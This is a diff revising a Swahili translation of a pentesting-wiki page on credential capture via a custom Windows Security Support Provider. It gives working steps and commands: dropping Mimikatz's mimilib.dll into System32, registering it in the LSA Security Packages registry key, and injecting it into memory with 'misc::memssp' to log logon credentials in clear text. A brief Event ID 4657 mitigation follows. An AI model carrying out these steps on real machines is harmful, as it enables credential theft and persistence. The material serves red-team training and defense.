@@ -4,37 +4,37 @@
 
 ### Custom SSP
 
-[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
-Unaweza kuunda **SSP yako mwenyewe** ili **kukamata** katika **maandishi wazi** **akili** zinazotumika kufikia mashine.
+[Jifunze SSP (Security Support Provider) ni nini hapa.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
+Unaweza kuunda **SSP yako mwenyewe** ili **kunasa** **credentials** zinazotumiwa kufikia mashine katika **clear text**.
 
 #### Mimilib
 
-Unaweza kutumia `mimilib.dll` binary inayotolewa na Mimikatz. **Hii itarekodi ndani ya faili akili zote katika maandiko wazi.**\
-Tupa dll katika `C:\Windows\System32\`\
-Pata orodha ya Pakiti za Usalama za LSA zilizopo:
+Unaweza kutumia binary ya `mimilib.dll` iliyotolewa na Mimikatz. **Hii itaandika credentials zote katika clear text ndani ya faili.**\
+Weka dll katika `C:\Windows\System32\`\
+Pata orodha ya LSA Security Packages zilizopo:
 ```bash:attacker@target
 PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
 
 HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
 Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
 ```
-Ongeza `mimilib.dll` kwenye orodha ya Watoa Huduma za Usalama (Security Packages):
+Ongeza `mimilib.dll` kwenye orodha ya Security Support Provider (Security Packages):
 ```bash
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
-Na baada ya kuanzisha upya, akreditivu zote zinaweza kupatikana kwa maandiko wazi katika `C:\Windows\System32\kiwissp.log`
+Na baada ya kuwasha upya, credentials zote zinaweza kupatikana katika maandishi wazi kwenye `C:\Windows\System32\kiwissp.log`
 
-#### Katika kumbukumbu
+#### In memory
 
-Unaweza pia kuingiza hii moja kwa moja katika kumbukumbu ukitumia Mimikatz (zingatia kwamba inaweza kuwa na utata kidogo/isiweze kufanya kazi):
+Unaweza pia ku-inject hii moja kwa moja kwenye memory ukitumia Mimikatz (kumbuka kwamba inaweza kuwa unstable kidogo/kutofanya kazi):
 ```bash
 privilege::debug
 misc::memssp
 ```
-Hii haitadumu baada ya kuanzisha upya.
+Hii haitadumu baada ya kuwasha upya.
 
-#### Mitigation
+#### Hatua za kupunguza madhara
 
-Event ID 4657 - Ukaguzi wa uundaji/mabadiliko ya `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
+Event ID 4657 - Kagua uundaji/mabadiliko ya `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
 
 {{#include ../../banners/hacktricks-training.md}}
